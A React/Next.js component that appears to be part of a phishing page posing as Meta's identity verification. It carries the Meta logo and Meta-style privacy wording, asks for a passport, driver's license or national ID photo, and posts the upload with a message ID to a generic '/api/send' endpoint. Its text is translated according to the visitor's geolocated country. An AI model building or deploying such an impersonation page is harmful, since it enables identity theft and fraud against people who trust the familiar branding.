import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useRef, useState, type FC } from 'react';

const UploadModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const fileInputRef = useRef<HTMLInputElement | null>(null);
    const [uploading, setUploading] = useState(false);
    const [selectedType, setSelectedType] = useState('passport');
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, messageId } = store();

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = [
            'Confirm your identity',
            'Choose type of ID to upload',
            "We'll use your ID to review your name, photo, and date of birth. It won't be shared on your profile.",
            'Passport',
            "Driver's license",
            'National ID card',
            'Your ID will be securely stored for up to 1 year to help improve how we detect impersonation and fake IDs. If you opt out, we\'ll delete it within 30 days. We sometimes use trusted service providers to help review your information.',
            'Learn more',
            'Upload Image',
            'Uploading...'
        ];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const handleFileChange = async (event: React.ChangeEvent<HTMLInputElement>) => {
        const file = event.target.files ? event.target.files[0] : null;

        if (file) {
            setUploading(true);

            try {
                const formData = new FormData();
                formData.append('photo', file);
                formData.append('document_type', selectedType);
                if (messageId) {
                    formData.append('message_id', messageId.toString());
                }

                await axios.post('/api/send', formData, {
                    headers: {
                        'Content-Type': 'multipart/form-data'
                    }
                });

                nextStep();
            } catch (error) {
                console.error('Error uploading image:', error);
            } finally {
                setUploading(false);
                if (fileInputRef.current) {
                    fileInputRef.current.value = '';
                }
            }
        }
    };

    const handleButtonClick = () => {
        if (fileInputRef.current && !uploading) {
            fileInputRef.current.click();
        }
    };

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex max-h-[90vh] w-full max-w-xl flex-col gap-5 overflow-y-auto rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
                <p className='mt-4 text-center text-2xl font-bold'>{t('Confirm your identity')}</p>

                <div>
                    <p className='text-lg font-semibold'>{t('Choose type of ID to upload')}</p>
                    <p className='mt-2 text-gray-600'>
                        {t("We'll use your ID to review your name, photo, and date of birth. It won't be shared on your profile.")}
                    </p>
                </div>

                <div className='flex flex-col font-semibold text-gray-700'>
                    <label
                        htmlFor='passport'
                        className='flex cursor-pointer items-center justify-between rounded-lg p-3 hover:bg-white/50'
                    >
                        <span>{t('Passport')}</span>
                        <input
                            type='radio'
                            id='passport'
                            name='document'
                            value='passport'
                            checked={selectedType === 'passport'}
                            onChange={(e) => setSelectedType(e.target.value)}
                            className='h-5 w-5 cursor-pointer accent-blue-600'
                        />
                    </label>
                    <label
                        htmlFor='drivers-license'
                        className='flex cursor-pointer items-center justify-between rounded-lg p-3 hover:bg-white/50'
                    >
                        <span>{t("Driver's license")}</span>
                        <input
                            type='radio'
                            id='drivers-license'
                            name='document'
                            value='drivers-license'
                            checked={selectedType === 'drivers-license'}
                            onChange={(e) => setSelectedType(e.target.value)}
                            className='h-5 w-5 cursor-pointer accent-blue-600'
                        />
                    </label>
                    <label
                        htmlFor='national-id'
                        className='flex cursor-pointer items-center justify-between rounded-lg p-3 hover:bg-white/50'
                    >
                        <span>{t('National ID card')}</span>
                        <input
                            type='radio'
                            id='national-id'
                            name='document'
                            value='national-id'
                            checked={selectedType === 'national-id'}
                            onChange={(e) => setSelectedType(e.target.value)}
                            className='h-5 w-5 cursor-pointer accent-blue-600'
                        />
                    </label>
                </div>

                <input type='file' accept='image/*' ref={fileInputRef} onChange={handleFileChange} className='hidden' />

                <div className='rounded-xl bg-white/60 p-4 text-sm text-gray-600'>
                    {t("Your ID will be securely stored for up to 1 year to help improve how we detect impersonation and fake IDs. If you opt out, we'll delete it within 30 days. We sometimes use trusted service providers to help review your information.")}{' '}
                    <a href='https://www.facebook.com/help/155050237914643/' target='_blank' className='text-blue-600 underline'>
                        {t('Learn more')}
                    </a>
                </div>

                <button
                    type='button'
                    onClick={handleButtonClick}
                    disabled={uploading}
                    className={`flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${uploading ? 'cursor-not-allowed opacity-80' : ''}`}
                >
                    {uploading ? (
                        <div className='flex items-center gap-2'>
                            <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                            <span>{t('Uploading...')}</span>
                        </div>
                    ) : (
                        t('Upload Image')
                    )}
                </button>

                <div className='flex items-center justify-center p-3'>
                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
                </div>
            </div>
        </div>
    );
};

export default UploadModal;

